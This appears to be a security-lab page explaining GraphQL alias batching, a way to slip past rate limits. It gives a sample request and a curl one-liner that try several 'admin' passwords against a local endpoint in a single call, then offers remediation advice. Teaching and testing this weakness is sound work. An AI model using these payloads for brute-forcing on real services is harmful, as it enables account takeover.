GraphQL Alias Batching — Rate Limit Bypass

OWASP API4 · N credential checks in 1 HTTP request · Rate limiter sees 1 call

Distinct from array batching (list of operations) and depth DoS (nested fields). A single query body with multiple aliased field resolutions executes each one independently. A rate limiter counting HTTP requests sees 1; the server performs N credential checks.
Example — 3 password guesses in 1 request: 
POST /api/v5/graphql/alias-batch
Content-Type: application/json

{
  "query": "{ a1: checkLogin(username:\"admin\", password:\"pass1\") { ok }
             a2: checkLogin(username:\"admin\", password:\"aegis2024\") { ok }
             a3: checkLogin(username:\"admin\", password:\"pass3\") { ok } }"
}
curl one-liner: 
curl -s -X POST http://localhost:5000/api/v5/graphql/alias-batch \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<your-cookie>" \
  -d '{"query":"{ a1: checkLogin(username:\"admin\", password:\"aegis2024\") { ok } a2: checkLogin(username:\"admin\", password:\"wrong\") { ok } }"}'
Remediation: Count alias fields server-side and enforce a per-request alias cap. Most GraphQL frameworks support query complexity / alias limits as middleware.
